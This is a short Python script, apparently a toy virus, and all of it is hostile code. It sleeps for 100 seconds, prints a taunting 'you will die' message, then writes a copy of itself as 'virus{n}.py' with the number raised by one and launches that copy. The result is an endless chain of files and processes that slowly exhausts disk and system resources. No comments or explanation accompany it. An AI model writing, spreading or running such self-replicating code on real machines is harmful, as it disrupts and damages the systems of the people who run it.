import time
import os
import subprocess

time.sleep(100)
file_path = os.path.abspath(__file__)
s = os.path.basename(file_path)
n = int(s[5: len(s)-3]) + 1
print(f"hacker is in process112233 {n}Hahahaa you will dieSoon...hehe\n163586814s6df46s81f46")

file1 = open(f"virus{n}.py","w")
file1.write(open(file_path, 'r').read())
file1.close()
subprocess.call(["python", f"virus{n}.py"])
